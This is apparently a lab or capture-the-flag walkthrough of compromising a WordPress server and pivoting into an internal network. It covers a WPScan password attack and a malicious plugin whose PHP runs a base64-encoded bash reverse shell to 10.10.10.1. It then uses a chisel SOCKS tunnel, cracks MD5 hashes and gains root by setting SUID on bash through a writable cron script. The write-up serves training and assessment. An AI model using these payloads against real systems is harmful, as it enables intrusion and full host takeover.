<aside>
📂

**`IP:`**  `10.10.10.2 | 20.20.20.3`

**`OS:`**  `Linux`

**`Ports:`**   `80` 

**`Users:`**  `nightblade **|** jsmith **|** krav0`

</aside>

## **Reconnaissance**

From nmap scan only port 80 was found open.

```bash
└─$ nmap 10.10.10.2                                    
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-25 12:10 -0400
Nmap scan report for 10.10.10.2
Host is up (0.000013s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 9A:85:88:57:19:37 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.63 seconds
```

<img width="701" height="205" alt="image" src="https://github.com/user-attachments/assets/b7e660e6-56bf-4151-984b-a95249ded57c" />



## **Information Disclosure**

I have run gobuster to enumerate pages and found `wp` and `robots.txt` 

```bash
─$ gobuster dir -u http://10.10.10.2 -w /usr/share/wordlists/dirb/common.txt -x .php,.txt,.bkp,.json

```

!image.png

Inspecting the **`robots.txt`** file revealed two `Disallow` entries: the standard **WordPress administration** path and a second entry consisting of a long hexadecimal string. The unusual value appeared to reference a hidden resource and became the next target for enumeration.

!image.png

Browsing the `wp` page, I have found that wordpress is running there. 

!image.png

## **WordPress Enumeration**

I then ran **WPScan** against the target to enumerate the WordPress installation. The scan identified the WordPress version, installed components, and valid user accounts, providing valuable information for the next stage of the assessment.

```bash
└─$ sudo wpscan --url http://10.10.10.2/wp --enumerate u --plugins-detection passive
```

!image.png

!image.png

## **Credential Recovery**

I initially launched an **XML-RPC** password attack against the **`krav0`** account using the **`rockyou.txt`** wordlist. After approximately **10 minutes** without success, I stopped the attack as it was proving inefficient. Instead, I shifted focus to the suspicious string previously discovered in **`robots.txt`** and continued my enumeration there.

```bash
└─$ sudo wpscan --password-attack xmlrpc -t 20 -U krav0 -P /usr/share/wordlists/rockyou.txt --url http://10.10.10.2/wp 
```

!image.png

The string was double-encoded (hex → Base64). I have decoded it and it exposed a hidden path:

```bash
User-agent: *
Disallow: /wp/wp-admin/
Disallow: 4c334d7a5933497a6445417662476c7a644335306548513d0a
```

```bash
$ echo "4c334d7a5933497a6445417662476c7a644335306548513d0a" | xxd -r -p | base64 -d
/s3cr3t@/list.txt
```

!image.png

Accessing the hidden path returned a **small, targeted password wordlist**. I used this custom list with **WPScan** to perform another XML-RPC password attack against the **`krav0`** account. This time, the correct password was recovered almost immediately, providing valid WordPress credentials.

!image.png

!image.png

```bash
└─$ sudo wpscan --url http://10.10.10.2/wp --passwords list.txt

Username: **krav0**, Password: **voidwalker**
```

!image.png

## **Admin Panel**

!image.png

!image.png

After obtaining valid credentials, I attempted to access the WordPress admin panel at `http://10.10.10.2/wp/wp-admin`. However, every request was redirected to **`172.17.0.2`**, revealing that the WordPress **`siteurl`** and **`home`** settings were hardcoded to the container's internal Docker IP, which was not reachable from my machine.

To work around this, I configured **Burp Suite** **Match and Replace** rules to rewrite the internal Docker IP to the target's reachable address. I applied the rules to both **HTTP response headers** (rewriting the `Location` header) and the **response body** (updating form actions and internal links), allowing me to interact with the WordPress admin interface normally.

```bash
Response header   172.17.0.2 → 10.10.10.2   (Literal)
Response body      172.17.0.2 → 10.10.10.2   (Literal)
```

!image.png

!image.png

!image.png

!image.png

!image.png

## **Remote Code Execution via Plugin Upload**

After applying the Burp Suite rewrite rules, I was able to access the WordPress login page and admin dashboard through **10.10.10.2**.

!image.png

The compromised account had permission to upload plugins. Since WordPress rejects arbitrary PHP files as invalid plugins, I packaged my payload as a valid WordPress plugin with the required plugin header before uploading it.

```bash
#payload in base64
└─$ echo "bash -c '/bin/bash -i >& /dev/tcp/10.10.10.1/6666 0>&1'" | base64

#shell payload
└─$ cat shell.php 
<?php
/*
Plugin Name: HACKED
Description: Plugin to execute system commands through the URL (only in a controlled environment).
Version: 66666666.0
Author: d1se0
*/
?>
<?php
system("echo 'YmFzaCAtYyAnL2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjEwLjEvNjY2NiAwPiYxJwo=' | tee /tmp/shell; base64 -d /tmp/shell | bash");
?>

```

The Base64 blob decodes to a standard reverse shell:

```bash
bash -c '/bin/bash -i >& /dev/tcp/10.10.10.1/6666 0>&1'
```

I zipped the plugin and uploaded it through the **WordPress Plugin Upload** feature.

```bash
mkdir shell
mv shell.php shell/
zip -r shell.zip shell/
```

!image.png

!image.png

Upload was successful

!image.png

!image.png

I activated the uploaded plugin and gained a shell as `www-data`. 

!image.png

!image.png

## **Pivoting into the Internal Network**

The compromised host had a second network interface connected to the **20.20.20.0/24** subnet, which was not directly reachable from my machine. I transferred a **chisel** binary to the target using a temporary Python HTTP server and established a **reverse SOCKS5** tunnel to pivot into the internal network.

!image.png

!image.png

```bash
#attacker machine
$ ./chisel server -p 9999 --reverse --socks5 -v 

#target 
./chisel client 10.10.10.1:9999 R:socks
```

!image.png

!image.png

## **Internal Enumeration**

Initially, I could not access **20.20.20.3** in the browser. After routing my traffic through the **SOCKS5** tunnel, the host became accessible, confirming it was reachable from the pivot point.

```bash
└─$ proxychains -f /etc/proxychains4.conf -q curl http://20.20.20.3
```

The host returned the default **Apache** page. 

!image.png

!image.png

I then configured **FoxyProxy** to route browser traffic through the same **SOCKS5** proxy, allowing me to access the application over the pivot.

!image.png

!image.png

The initial content scan through the tunnel found only **`index.php`** and **`index.html`**. As this provided little value, I repeated the scan using a broader set of file extensions, which revealed additional content.

```bash
─$  proxychains -f /etc/proxychains4.conf -q dirb http://20.20.20.3/ /usr/share/wordlists/dirb/common.txt -X .php,.html,.txt
```

!image.png

The expanded scan revealed **`db.sql`**, which was downloadable directly. Inspecting the database dump exposed several user password hashes.

```bash
─$ proxychains -f /etc/proxychains4.conf -q dirb http://20.20.20.3/ /usr/share/wordlists/dirb/common.txt -X .php,.html,.txt,.sql,.db,.zip,.bak,.pdf,.backup,.json,.xml 
```

!image.png

!image.png

When I reached to `/db.sql` page, the file was downloaded.

I identified the hashes as **unsalted MD5** using hash-identifier**.**

!image.png

!image.png

Then I cracked them with **John the Ripper** using the **`rockyou.txt`** wordlist, recovering the plaintext passwords.

```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt users.txt
```

```bash
dragon           (**nightblade**)     
password123      (**jsmith**)     
voidwalker       (**krav0**) 
```

!image.png

## **SSH Access**

The recovered **`nightblade`** credentials provided SSH access to the internal host.

!image.png

## **Privilege Escalation**

I enumerated scheduled tasks and identified a custom **root** cron job.

```bash
$ cat /etc/cron.d/nightblade 
* * * * * root /opt/scripts/check.sh
```

!image.png

The script **`/opt/scripts/check.sh`** was writable by the current user and executed as **root** every minute via cron.

!image.png

 I modified the script to set the **SUID** bit on `/bin/bash`, allowing me to obtain a root shell when the job executed.

```bash
#!/bin/bash
chmod u+s /bin/bash
```

!image.png

Once the cron job executed, I obtained a **root** shell using the SUID-enabled `bash` binary.

```bash
$ bash -p
```

!image.png

I obtained **root** access, fully compromising the target system.

## Findings Overview

| # | Finding | Severity |
| --- | --- | --- |
| 1 | Sensitive path disclosed via `robots.txt` (obfuscated, not protected) | Medium |
| 2 | Publicly accessible custom password list | High |
| 3 | Weak / guessable WordPress administrator credentials | High |
| 4 | Authenticated remote code execution via plugin upload | Critical |
| 5 | Internal database dump (`db.sql`) exposed over HTTP | High |
| 6 | Weak password hashing (unsalted MD5) and credential reuse | High |
| 7 | World-writable root cron script → local privilege escalation | Critical |
